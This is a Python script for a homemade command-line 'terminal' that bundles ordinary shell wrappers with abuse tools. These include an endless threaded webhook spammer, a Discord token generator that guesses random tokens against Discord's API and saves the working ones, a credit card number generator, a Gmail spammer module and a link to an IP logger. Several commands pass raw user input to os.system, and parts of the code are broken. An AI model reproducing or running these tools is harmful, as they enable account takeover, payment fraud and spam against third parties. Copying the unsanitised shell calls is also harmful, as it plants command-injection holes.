#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pystyle import *
from os import system as s 
from time import sleep as sl 
import random,requests,os,webbrowser,getpass,base64,string,traceback,time,json
from threading import Thread
from random import randint
from sys import platform
from lxml.html import fromstring
from itertools import cycle
from colorama import Fore as f
from Config.config import *
Write.Print("[*] Starting terminal..\..",Colors.green,
interval=0.002)
prefix = "$> "
sl(1)
s("color a")
s("cls || clear")
s("title [*] Terminal Loaded || Made by opw#8452")
print(f.RED+random.choice(banner))
print("Type help or ? to see all the commands")
while True:
 cmd = input(prefix)
 if cmd == "ls" or cmd == "dir":
    s("dir")
 elif cmd == "python":
    s("python")
 elif cmd == "clear" or cmd == "cls":
    s("cls")
 elif cmd == "exit" or cmd == "quit":
    exit("Exitting..")
 elif cmd == "version" or cmd == "Version" or cmd == "VERSION":
   print(f.RED+"[!] V1.0")
 elif cmd == "banner":
  print(random.choice(banner))
 elif cmd == "?" or cmd == "help":
    print(f.LIGHTRED_EX+"""

            Global Commands
            ---------------

    Command       Description
    -------       -----------
    ?/help        Help menu
    Dir/ls        Display files
    Cat           Display content of a file
    cd            Change currect directory
    prefix        Changes the current prefix
    Path          Display path
    Spammer       Webhook spammer
    Sleep         Do nothing for seconds
    espam         Gmail spammer
    Color         Change color(random)
    Banner        Display a random banner
    iplogger      Ip logger tool
    Version       Current version
    Exit/Quit     Finish the session
    Python        Start python console
    Clear/cls     Clean terminal
    Ping          Ping a host/ip
    espam         Gmail Spammer
    Website       Check a websites status (404 or 200)
    Systeminfo    System information
    Generator     Credit Card Generator
    Restart       Restarts the program
    Save          Save commands
    Login         Saves your Username,password on a txt file
    Write         Open a word file
    Calculator    Open a calculator
    Ipinfo        See your IP adress and more things
    ipinfo2       See your public IP adress
    Open          Opens a website in your browser(You put the website)
    folder        Create a folder
    file          Create a txt file
    localhost     Runs a localhost service(python)
    tree          I don't know
    explorer      Opens explorer
    tgen          Token generator & checker (Not made by me)
    shutdown      Turns off your pc
    discord       Opens my discord profile fr"""
)
 elif cmd == "color" or cmd == "colors":
   s("color " + random.choice(colors))
 elif cmd == "sleep":
    sl(4)
    f.write(cmd)
 elif cmd == "save":
   fe = open("data.txt",'a')
   fe.write(cmd)
 elif cmd == "tree":
   s("tree")
 elif cmd == "ping":
   host = input(f.RED+"Host: ")
   s("ping "+ host)
 elif cmd == "Website" or cmd == "website":
  web = input(f.RED+"Website: ")
  d = requests.get(web)
  if d.status_code == 404 or d.status_code == 404:
   print("404 Not found")
  elif d.status_code == 200:
   print("200 Working ")
 elif cmd == "prefix":
    prefix = input("New prefix: ")
 elif cmd == "systeminfo" or cmd == "sysinfo":
   s("systeminfo")
 elif cmd == "cd":
  directory = input(f.RED+"Directory: ")
  s("cd  "+ directory)
 elif cmd == "generator" or cmd == "generate":
    c = time.ctime()
    print(f.RED + "[" + c.split(" ")[3]  + "]" + " Number: " + f.GREEN + (random.choice(card)))
    print(f.RED + "[" + c.split(" ")[3]  + "]" + " Cvc:  " + f.GREEN + (random.choice(cvc)))
    print(f.RED + "[" + c.split(" ")[3]  + "]" + " Expires:  " + f.GREEN + (random.choice(expires)))
 elif cmd == "spammer" or cmd == "spam":
   webhook = input(f.RED+"Webhook: ")
   def yes():
      while True:
       requests.post(webhook,headers=headers,json=data)
   while True:
      print(f.GREEN+"[*] Spamming webhook")
      thr = Thread(target=yes)
      thr.start()
      thr.join()
 elif cmd == "path":
   s("path")
 elif cmd == "cat":
   filename = input(f.RED+"File: ")
   s("type " + filename)
 elif cmd == "login":
   user = input(f.RED+"Username: ")
   password = getpass.getpass(f.RED+"Password: ")
   login = open("login.txt",'a')
   login.write("Username: " + str(user
    ))
   login.write("Password: " + str(password
    ))
 elif cmd == "write":
   s("write")
 elif cmd == "calculator" or cmd == "calc":
   s("calc")
 elif cmd == "ip info" or cmd == "ipinfo" or cmd == "Ip Info" or cmd == "IP INFO":
   s("ipconfig")
 elif cmd == "ipinfo2":
   d = requests.get("https://ipinfo.io/json").json()
   print(d)
 elif cmd == "folder":
  folder = input(f.RED+"Folder name: ")
  s("mkdir " + folder)
 elif cmd == "file":
  oka = input(f.RED+"File's name: ")
  f = open(oka)
  f.write("Hello!")
 elif cmd == "localhost":
  s("python -m http.server")
  webbrowser.open("https://localhost:8000")  
 elif cmd == "open" or cmd == "Open":  
   web2 = input(f.RED+"Website: ")
   if "https://" not in web2:
    webbrowser.open("https://"+web2)
   webbrowser.open(web2)
 elif cmd == "tree":
  s("tree")
 elif cmd == "reload":
  s("python main.py")
 elif cmd == "explorer":
  s("explorer")
 elif cmd == "shutdown":
  if platform == "win32":
    s("shutdown -s")
  elif platform == "linux" or platform == "Linux2":
    s("shutdown")
 elif cmd == "tgen":
  N = input("How Many Discord Tokens : ")
  count = 0
  current_path = os.path.dirname(os.path.realpath(__file__))
  url = "https://discordapp.com/api/v6/users/@me/library"
  while(int(count) < int(N)):
    tokens = []
    base64_string = "=="
    while(base64_string.find("==") != -1):
        sample_string = str(randint(000000000000000000, 999999999999999999))
        sample_string_bytes = sample_string.encode("ascii")
        base64_bytes = base64.b64encode(sample_string_bytes)
        base64_string = base64_bytes.decode("ascii")
    else:
        token = base64_string+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits)
                                                                                      for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(38))
        count += 1
        tokens.append(f.RED+token)
    for token in tokens:
        header = {
            "Content-Type": "application/json",
            "authorization": token
        }
        r = requests.get(url, headers=header,)
        print(token)
        if r.status_code == 200:
            print(u"\u001b[32;1m[+] Token Works!\u001b[0m")
            f = open(current_path+"/"+"workingtokens.txt", "a")
            f.write(token+"\n")
        elif "rate limited." in r.text:
            print("[-] You are being rate limited.")
        else:
            print(u"\u001b[31m[-]Invalid Token.\u001b[0m")
    tokens.remove(token)
 elif cmd == "espam":
  s('cd Modules && espam ')
 elif cmd == "credits":
  print(f.BLUE+"""
  Token generator by Gamer3514 (I think)

  Email spammer was made using openai (I edited it)
  
  The other things are made by me yes

  """)
 elif cmd == "discord" or cmd == "dis":
  webbrowser.open("https://discord.com/users/1018512700269150248")
 elif cmd == "restart" or cmd == "Restart" or cmd == "re":
  s(' cmd /k "python main.py"')
 elif cmd == "iplogger" or cmd == "log":
   webbrowser.open("https://github.com/Opwwww/discord-ip-logger")
 elif cmd == "opw":
   print("fr")
 else:
    d = print(f.RED+"[-] Unknown Command: "+cmd)
